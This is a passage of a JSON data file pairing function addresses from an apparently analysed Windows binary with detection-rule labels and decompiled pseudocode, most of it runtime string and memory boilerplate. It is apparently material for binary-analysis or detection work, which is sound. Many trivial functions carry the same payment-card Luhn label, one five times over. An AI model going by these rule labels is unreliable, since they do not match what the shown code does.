}\n                *(*in_ECX + arg_10h) = 0;\n                return;\n            }\n            goto code_r0x004016c4;\n        }\n        arg_10h = arg_ch + arg_10h;\n        if (arg_10h <= in_ECX[4]) {\n            in_ECX[4] = arg_10h;\n            if (0xf < in_ECX[5]) {\n                *(*in_ECX + arg_10h) = 0;\n                fcn.004016d0(arg_ch, arg_ch);\n                return;\n            }\n            *(in_ECX + arg_10h) = 0;\n            fcn.004016d0(arg_ch, arg_ch);\n            return;\n        }\n    }\n    fcn.004063b9(\"invalid string position\");\ncode_r0x004016c4:\n    fcn.00406399(\"string too long\");\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 650
    },
    "004133aa": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004133aa(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040e476(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "004014b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014b0(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t **in_ECX;\n    \n    if (arg_8h != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar3 = in_ECX;\n        if (0xf < piVar1) {\n            ppiVar3 = *in_ECX;\n        }\n        if (ppiVar3 <= arg_8h) {\n            ppiVar3 = in_ECX;\n            if (0xf < piVar1) {\n                ppiVar3 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + ppiVar3) {\n                if (0xf < piVar1) {\n                    fcn.004015b0(in_ECX, arg_8h - *in_ECX, arg_ch);\n                    return;\n                }\n                fcn.004015b0(in_ECX, arg_8h - in_ECX, arg_ch);\n                return;\n            }\n        }\n    }\n    if (arg_ch == 0xffffffff) {\n        fcn.00406399(\"string too long\");\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (in_ECX[5] < arg_ch) {\n        fcn.00401750(arg_ch, in_ECX[4]);\n        if (arg_ch == NULL) {\n            return;\n        }\n    }\n    else if (arg_ch == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar3 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        ppiVar3 = *in_ECX;\n    }\n    if (arg_ch != NULL) {\n        fcn.00419bb0(ppiVar3, arg_8h, arg_ch);\n    }\n    in_ECX[4] = arg_ch;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + arg_ch) = 0;\n        return;\n    }\n    *(*in_ECX + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 541
    },
    "004016d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016d0(uint noname_0, int32_t *arg_ch)\n\n{\n    int32_t **in_ECX;\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    \n    if (in_ECX[4] <= arg_ch) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (arg_ch != NULL) {\n        ppiVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar1 = *in_ECX;\n        }\n        piVar2 = in_ECX[4] - arg_ch;\n        if (piVar2 != NULL) {\n            fcn.00407090(ppiVar1, arg_ch + ppiVar1, piVar2);\n        }\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "004018f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004018f0(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    if (0xfff < arg_8h) {\n        if (arg_8h < arg_8h + 0x23) {\n            iVar2 = fcn.0040661a(arg_8h + 0x23);\n            uVar3 = iVar2 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar2;\n            return uVar3;\n        }\n        fcn.0040637c();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    uVar3 = fcn.0040661a(arg_8h);\n    return uVar3;\n}\n",
        "token_count": 218
    },
    "00401c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c40(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    \n    *in_ECX = 0;\n    piVar3 = in_ECX + 1;\n    for (iVar1 = 200; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    iVar1 = *arg_8h;\n    iVar2 = 0;\n    *in_ECX = iVar1;\n    if (0 < iVar1) {\n        piVar3 = in_ECX + 1;\n        do {\n            *piVar3 = *((arg_8h - in_ECX) + piVar3);\n            iVar2 = iVar2 + 1;\n            piVar3 = piVar3 + 1;\n        } while (iVar2 < *in_ECX);\n    }\n    in_ECX[0xc9] = 0;\n    piVar3 = in_ECX + 0xca;\n    for (iVar1 = 200; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    iVar1 = arg_8h[0xc9];\n    piVar3 = in_ECX + 0xc9;\n    iVar2 = 0;\n    *piVar3 = iVar1;\n    if (0 < iVar1) {\n        piVar4 = in_ECX + 0xca;\n        do {\n            *piVar4 = *(((arg_8h + 0xc9) - piVar3) + piVar4);\n            iVar2 = iVar2 + 1;\n            piVar4 = piVar4 + 1;\n        } while (iVar2 < *piVar3);\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "00402000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402000(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    do {\n        uVar4 = 0;\n        uVar3 = 0;\n        if (arg_8h != 1) {\n            do {\n                uVar1 = *(in_ECX + 4);\n                do {\n                    uVar2 = fcn.00402080();\n                } while (*(in_ECX + 8) <= uVar2 && uVar2 != *(in_ECX + 8));\n                uVar4 = (uVar4 << (uVar1 - 1U & 0x1f)) * 2 | uVar2;\n                uVar3 = (uVar3 << (*(in_ECX + 4) - 1U & 0x1f)) * 2 | *(in_ECX + 8);\n            } while (uVar3 < arg_8h - 1);\n        }\n    } while ((uVar3 / arg_8h <= uVar4 / arg_8h) && (uVar3 % arg_8h != arg_8h - 1));\n    return uVar4 % arg_8h;\n}\n",
        "token_count": 295
    },
    "00402480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402480(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint in_stack_fffffcc4;\n    uint var_334h;\n    uint var_330h;\n    uint var_4h;\n    \n    piVar1 = fcn.00402390(arg_8h);\n    piVar4 = in_EDX;\n    for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar4 = *piVar1;\n        piVar1 = piVar1 + 1;\n        piVar4 = piVar4 + 1;\n    }\n    *in_ECX = 0;\n    piVar1 = in_ECX + 1;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar1 = 0;\n        piVar1 = piVar1 + 1;\n    }\n    iVar3 = 0;\n    iVar2 = *in_EDX;\n    *in_ECX = iVar2;\n    if (0 < iVar2) {\n        piVar1 = in_ECX + 1;\n        do {\n            *piVar1 = *((in_EDX - in_ECX) + piVar1);\n            iVar3 = iVar3 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar3 < *in_ECX);\n    }\n    fcn.0040640a(in_stack_fffffcc4);\n    return;\n}\n",
        "token_count": 380
    },
    "00402970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_338h\n\nvoid __cdecl fcn.00402970(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *in_EDX;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    int32_t var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint var_32ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    iVar2 = *in_EDX;\n    puVar5 = &var_32ch;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = 0;\n    if (0 < iVar2) {\n        piVar4 = in_EDX + 1;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n            (&var_32ch)[iVar3] = iVar1;\n            iVar3 = iVar3 + 1;\n            var_338h = iVar2;\n        } while (iVar3 < iVar2);\n    }\n    if (arg_8h == 0) {\n        piVar4 = in_ECX + 1;\n        piVar6 = piVar4;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        iVar3 = 0;\n        *in_ECX = iVar2;\n        if (0 < iVar2) {\n            do {\n                *piVar4 = (&var_32ch)[iVar3];\n                iVar3 = iVar3 + 1;\n                piVar4 = piVar4 + 1;\n            } while (iVar3 < *in_ECX);\n            fcn.0040640a(var_338h);\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.00402a80(arg_8h);\n        piVar4 = in_ECX + 1;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *piVar4 = 0;\n            piVar4 = piVar4 + 1;\n        }\n        *in_ECX = iVar2;\n        iVar3 = 0;\n        piVar4 = in_ECX + 1;\n        if (0 < iVar2) {\n            do {\n                *piVar4 = (&var_32ch)[iVar3];\n                iVar3 = iVar3 + 1;\n                piVar4 = piVar4 + 1;\n            } while (iVar3 < *in_ECX);\n        }\n    }\n    fcn.0040640a(var_338h);\n    return;\n}\n",
        "token_count": 689
    },
    "00404620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404620(uint *param_1)\n\n{\n    uint *arg_8h;\n    uint uVar1;\n    \n    while (arg_8h = *param_1,  arg_8h != NULL) {\n        uVar1 = *arg_8h;\n        if (arg_8h[1] != 0) {\n            fcn.00406660(arg_8h[1]);\n        }\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        fcn.00406660(arg_8h);\n        *param_1 = uVar1;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00404660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404660(uint16_t *arg_8h)\n\n{\n    uint32_t arg_ch;\n    uint16_t uVar1;\n    uint uVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_ECX;\n    uint16_t *puVar6;\n    int32_t iVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = fcn.0040661a(8);\n    *puVar4 = 0;\n    puVar4[1] = 0;\n    puVar5 = puVar4;\n    puVar6 = arg_8h;\n    do {\n        uVar1 = *puVar6;\n        puVar5 = puVar5 & 0xffff0000;\n        puVar6 = puVar6 + 1;\n    } while (uVar1 != 0);\n    iVar7 = puVar6 - (arg_8h + 1) >> 1;\n    if (iVar7 < 0) {\n        return puVar5 | uVar1 & 0xffffff00;\n    }\n    arg_ch = iVar7 + 1;\n    iVar3 = arg_ch * 2;\n    puVar5 = fcn.00406657(-(iVar3 >> 0x20 != 0) | iVar3);\n    puVar4[1] = puVar5;\n    *puVar5 = 0;\n    fcn.0040cffe(puVar4[1], arg_ch, arg_8h, 10000);\n    uVar2 = *in_ECX;\n    *puVar4 = uVar2;\n    *in_ECX = puVar4;\n    return CONCAT31(uVar2 >> 8, 1);\n}\n",
        "token_count": 395
    },
    "004061e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004061e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    uint arg_1ch;\n    uint *arg_20h;\n    \n    arg_20h = &arg_10h;\n    arg_1ch = 0;\n    arg_14h = 10000;\n    puVar1 = fcn.004044c0();\n    iVar2 = fcn.0040cd59(*puVar1, puVar1[1], arg_8h, arg_14h, arg_ch, arg_1ch, arg_20h);\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 181
    },
    "0040a0b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0b4(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0040a22f(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 74
    },
    "0040a193": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a193(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.004044c0();\n    fcn.0040cce2(*puVar1, puVar1[1], arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 96
    },
    "0040a22f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a22f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040a193(arg_8h, arg_ch, 0, &arg_10h);\n    return;\n}\n",
        "token_count": 58
    },
    "0040b443": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b443(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.0040ae89(param_1 + 0x28);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x28) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 181
    },
    "0040b46b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b46b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.0040aee5(param_1 + 0x28);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x28) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 187
    },
    "0040bfde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040bfde(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.0040ae89(param_1 + 0x24);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x24) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        *(param_1 + 0x24) = -*(param_1 + 0x24);\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 214
    },
    "0040c009": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c009(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.0040aee5(param_1 + 0x24);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x24) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        *(param_1 + 0x24) = -*(param_1 + 0x24);\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 219
    },
    "0040cd7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040cd7d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.0040a62a(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 99
    },
    "0040d2e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d2e1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.004198d0(0x422f10, 0xc);\n    iVar1 = *(unaff_EBP + 0x10);\n    if (iVar1 == 0) {\n        cVar5 = fcn.0040d43b();\n        if (cVar5 != '\\0') {\n            fcn.0040d47f(*(unaff_EBP + 8));\n        }\n    }\n    fcn.00411e3f(2);\n    *(unaff_EBP + -4) = 0;\n    if (*0x424cd4 != '\\0') goto code_r0x0040d3b8;\n    *0x424ccc = 1;\n    *(unaff_EBP + -4) = 1;\n    iVar2 = *(unaff_EBP + 0xc);\n    if (iVar2 == 0) {\n        uVar4 = *0x424008 & 0x1f;\n        uVar3 = 0x20 - uVar4 & 0x1f;\n        if (*0x424cd0 != ((0U >> uVar3 | 0 << 0x20 - uVar3) ^ *0x424008)) {\n            uVar6 = *0x424008 ^ *0x424cd0;\n            (**0x41b190)(0, 0, 0);\n            (*(uVar6 >> uVar4 | uVar6 << 0x20 - uVar4))();\n        }\n        arg_8h_00 = 0x424df0;\ncode_r0x0040d37d:\n        fcn.0040dde7(arg_8h_00);\n    }\n    else if (iVar2 == 1) {\n        arg_8h_00 = 0x424dfc;\n        goto code_r0x0040d37d;\n    }\n    *(unaff_EBP + -4) = 0;\n    if (iVar2 == 0) {\n        fcn.0040e070(0x41b1d4, 0x41b1e4);\n    }\n    fcn.0040e070(0x41b1e8, 0x41b1ec);\n    if (iVar1 == 0) {\n        *0x424cd4 = '\\x01';\n    }\ncode_r0x0040d3b8:\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040d3eb();\n    if (iVar1 == 0) {\n        fcn.0040d3fa(*(unaff_EBP + 8));\n        fcn.0040d2ce(***(unaff_EBP + -0x14));\n        return;\n    }\n    fcn.00419919();\n    return;\n}\n",
        "token_count": 732
    },
    "0040f95c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f95c(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "0040f970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f970(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "0040fe96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040fe96(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f39c();\n    return iVar1 + 8;\n}\n",
        "token_count": 44
    },
    "0041029f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041029f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00410258(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.0040e7f9(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 122
    },
    "00411751": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411751(void)\n\n{\n    fcn.00411785(0x1a, \"MessageBoxA\", 0x41d440, \"MessageBoxA\");\n    return;\n}\n",
        "token_count": 43
    },
    "0041176b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041176b(void)\n\n{\n    fcn.00411785(0x1b, \"MessageBoxW\", 0x41d454, \"MessageBoxW\");\n    return;\n}\n",
        "token_count": 44
    },
    "00411e3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411e3f(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x425130);\n    return;\n}\n",
        "token_count": 49
    },
    "00411e87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411e87(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x425130);\n    return;\n}\n",
        "token_count": 49
    },
    "00412285": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412285(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004122ba();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.0040e476(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00412c1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412c1b(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.00416ff3(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.00417026(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.00408980(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.0040f5be();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 250
    },
    "0040902c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040902c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00408293(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00409a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409a00(void)\n\n{\n    code *pcVar1;\n    \n    fcn.00409975(0, 0, 0, 0, 0);\n    fcn.00409a1d(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 86
    },
    "00417a8a": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00417a8a(void)\n\n{\n    *0x424790 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00405760": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405760(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint liDistanceToMove;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    uint var_4h;\n    \n    lpNumberOfBytesWritten = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (iVar1 != 0) {\n            arg_8h_00 = 0x100;\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n            fcn.0040640a(arg_8h_00);\n            return;\n        }\n    }\n    fcn.0040640a(lpNumberOfBytesWritten);\n    return;\n}\n",
        "token_count": 185
    }
}